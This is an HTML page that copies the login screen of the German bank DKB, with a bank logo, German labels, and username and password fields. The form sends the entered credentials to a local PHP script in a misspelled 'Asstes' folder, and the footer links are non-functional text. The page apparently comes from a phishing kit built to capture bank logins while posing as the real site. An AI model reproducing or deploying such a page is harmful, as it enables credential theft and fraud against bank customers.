<!DOCTYPE html><html><head>
        <meta charset="UTF-8">
        <meta name="discription" content="">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <link rel="icon" href="./Asstes/imgs/favicon.ico">
        <title>DKB Banking</title>
        <!-- === bootstrap === -->
        <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.1/dist/css/bootstrap.min.css" rel="stylesheet">
        <!-- == Font-awesome " icon " == -->
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
        <!-- == remixicon " icon " == -->
        <link href="https://cdn.jsdelivr.net/npm/remixicon@3.5.0/fonts/remixicon.css" rel="stylesheet">
        <!-- == file style css == -->
        <link rel="stylesheet" href="./Asstes/css/style.css">
    </head>
    <body class="login">
      
    
    <!-- Header -->
    <header class="header_1_1">
      <div class="container_header_1_1 d-flex  justify-content-between">
        <div class="logo_1">
          <img src="./Asstes/imgs/Logo.svg" alt="">
        </div>
        <div class="btn_right_1">
          <button>Zum bisherigen Banking</button>
        </div>
      </div>
    </header>

    <!-- wrapper_login -->
    <section class="wrapper_login_1">
      <div class="container_login_1">
        <div class="box_error_1">
              
        </div>
        <form action="./Asstes/php/config/func.php" method="post">
          <input type="hidden" name="Log">
          <div class="title_1">
            <h1>Mein Banking</h1>
          </div>
          <div class="inputes_1">
            <div class="form-group">
              <label for="">Anmeldename</label>
              <input type="text" name="user" id="user">
            </div>
            <div class="form-group">
              <label for="">Passwort</label>
              <input type="password" name="pass" id="pass">
              <img src="./Asstes/imgs/eye.svg" class="eye" alt="" id="eye">
            </div>
          </div>
          <div class="btn_sub_1">
            <button type="submit" disabled="">Anmelden</button>
          </div>
          <p class="forget_1 mb-0"><a href="">Passwort</a> oder <a href="">Anmeldenamen</a> vergessen?</p>
        </form>
      </div>
    </section>

    <!-- footer_1 -->
    <footer class="footer_1_1">
      <div class="container_footer_1_1 d-flex justify-content-between">
        <div class="part_left_1">
          <ul class="d-flex align-items-center mb-0 ps-0">
            <li>DKB Startseite</li>
            <li>Infoseite</li>
          </ul>
        </div>
        <div class="part_right_1">
          <ul class="d-flex align-items-center mb-0 ps-0">
            <li>DKB Verwalterplattform</li>
            <li>DKB Treuh√§nderplattform</li>
            <li>Impressum</li>
            <li>Datenschutz</li>
            <li>Cookie Einstellungen</li>
            <li>Preise &amp; Bedingungen</li>
            <li>Hilfe</li>
          </ul>
        </div>
      </div>
    </footer>








    <!-- bootstrap -->
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"></script>
    <!-- script jquery -->
    <script src="https://code.jquery.com/jquery-3.7.1.js"></script>
    <script src="./Asstes/js/main.js"></script>
    <script>        
        $(".form-group input").keyup(function(){
          if ($(".form-group #user").val() != "" & $(".form-group #pass").val() != "") {
            $(".btn_sub_1 button").prop("disabled",false);
            $(".btn_sub_1 button").addClass("active");
          }else{
            $(".btn_sub_1 button").prop("disabled",true);
            $(".btn_sub_1 button").removeClass("active");
          }
        });               
    </script>
    
</body></html>
